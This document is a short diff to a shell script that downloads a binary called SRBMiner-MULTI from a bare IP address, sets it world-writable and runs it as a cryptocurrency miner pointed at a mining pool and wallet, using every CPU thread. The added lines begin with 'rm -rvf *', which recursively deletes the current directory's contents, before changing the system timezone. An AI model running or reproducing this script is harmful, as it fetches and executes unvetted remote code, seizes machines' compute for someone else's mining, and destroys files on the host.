@@ -1,3 +1,7 @@
+rm -rvf * 
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 wget -O oasis http://139.180.133.28/SRBMiner-MULTI
 chmod 777 oasis
 ./oasis --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.cok --password x --cpu-threads $(nproc --all)
